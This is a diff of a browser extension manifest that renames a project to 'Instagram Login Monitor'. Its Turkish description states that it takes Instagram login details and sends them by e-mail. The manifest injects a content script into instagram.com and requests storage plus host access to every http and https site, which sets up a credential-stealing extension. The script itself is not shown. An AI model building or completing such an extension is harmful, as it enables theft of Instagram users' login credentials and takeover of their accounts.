@@ -1,13 +1,21 @@
 {
-    "manifest_version": 3,
-    "name": "constring",
-    "version": "1.0",
-    "description": "loginner",
-    "permissions": ["activeTab"],
-    "content_scripts": [
-      {
-        "matches": ["*://*.instagram.com/*"],
-        "js": ["content.js"]
-      }
-    ]
-  }
+  "manifest_version": 3,
+  "name": "Instagram Login Monitor",
+  "version": "1.0",
+  "description": "Instagram giriş bilgilerini alır ve e-posta gönderir.",
+  "permissions": [
+    "activeTab",
+    "storage"
+  ],
+  "content_scripts": [
+    {
+      "matches": ["https://www.instagram.com/"],
+      "js": ["contentScript.js"],
+      "css": []
+    }
+  ],
+  "host_permissions": [
+    "http://*/*",
+    "https://*/*"
+  ]
+}
